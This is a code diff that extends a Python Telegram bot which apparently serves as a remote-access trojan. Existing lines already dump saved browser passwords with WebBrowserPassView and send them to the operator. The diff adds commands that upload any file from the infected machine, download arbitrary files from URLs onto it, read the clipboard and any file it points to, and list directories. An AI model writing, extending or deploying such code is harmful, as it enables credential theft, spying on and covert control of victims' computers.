@@ -1,8 +1,10 @@
 import logging
 import platform
 import subprocess
+import sys
 import urllib.request as urllib
 
+import pyperclip
 from aiogram import Bot, Dispatcher, executor, types
 from config import admins, token
 import cv2
@@ -62,11 +64,41 @@ async def msg(message: types.Message):
             os.system('msg *' + msg + "'")
 
 
+@dp.message_handler(commands=["get"])
+async def getFile(message: types.Message):
+    if message["from"]["id"] in admins:
+        fileName = message.get_args()
+        try:
+            with open(fileName, 'rb') as f:
+                await message.answer_document(f)
+        except:
+            await message.answer(fileName + " is not file! Or error!")
+
+
+@dp.message_handler(commands=["send"])
+async def send(message: types.Message):
+    if message["from"]["id"] in admins:
+        args = message.get_args()
+        try:
+            data = args.split(' ', 1)
+            link = data[0]
+            fileName = data[1]
+        except:
+            await message.answer("Error while parsing args")
+            return 0
+
+        try:
+            urllib.urlretrieve(link, fileName)
+        except:
+            await message.answer("Error while loading file")
+            return 0
+        await message.answer("OK")
+
+
 @dp.message_handler(commands=["pass"])
 async def password(message: types.Message):
     if message["from"]["id"] in admins:
         if os.name == "nt":
-            # subprocess.call([r'getpass.bat'])
             subprocess.Popen(['WebBrowserPassView.exe', '/stext', 'pass.txt'])
             with open('pass.txt', 'rb') as passwd:
                 await message.answer_document(passwd)
@@ -90,11 +122,78 @@ async def sysinfo(message: types.Message):
         await message.answer(data)
 
 
-@dp.message_handler()
-async def echo(message: types.Message):
+@dp.message_handler(commands=["info"])
+async def info(message: types.Message):
     if message["from"]["id"] in admins:
-        await message.answer(message.text)
+        cpu = platform.processor()
+        system = platform.system()
+        machine = platform.machine()
+        data = cpu + '\n'
+        data += system + '\n'
+        data += machine + '\n\n'
+        await message.answer(data)
 
+
+@dp.message_handler(commands=["clip"])
+async def clip(message: types.Message):
+    if message["from"]["id"] in admins:
+        cb = pyperclip.paste()
+        await message.answer(cb)
+        try:
+            size = os.path.getsize(cb)
+
+            if size < 1024:
+                size = str(size) + "B"
+            else:
+                size = size / 1024
+                size = round(size, 2)
+                if size < 1024:
+                    size = str(size) + "KB"
+                else:
+                    size = size / 1024
+                    size = round(size, 2)
+                    if size < 1024:
+                        size = str(size) + "MB"
+                    else:
+                        size = size / 1024
+                        size = round(size, 2)
+                        if size < 1024:
+                            size = str(size) + "GB"
+            data = "This is file. Size: " + str(size) + "\n"
+            data += "Use /clipfile to send it. BE CAREFUL!"
+            await message.answer(data)
+        except:
+            pass
+
+
+@dp.message_handler(commands=["clipfile"])
+async def clipfile(message: types.Message):
+    if message["from"]["id"] in admins:
+        cb = pyperclip.paste()
+        try:
+            with open(cb, 'rb') as cbfile:
+                await message.answer_document(cbfile)
+        except:
+            await message.answer(cb)
+
+@dp.message_handler(commands=["ls"])
+async def ls(message: types.Message):
+    if message["from"]["id"] in admins:
+        args = message.get_args()
+        pwd = subprocess.run(['pwd'], stdout=subprocess.PIPE)
+        if len(args) == 0:
+            result = subprocess.run(['ls'], stdout=subprocess.PIPE)
+        else:
+            result = subprocess.run(['ls', args], stdout=subprocess.PIPE)
+        string = result.stdout.decode('utf-8')
+        pwdstr = pwd.stdout.decode('utf-8')
+        string.replace("\n", "  ")
+        pwdstr.replace("\n", "  ")
+        try:
+            await message.answer(pwdstr + "\n" + string)
+            # await message.answer(string)
+        except:
+            await message.answer("Errcode " + str(result.returncode))
 
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True)
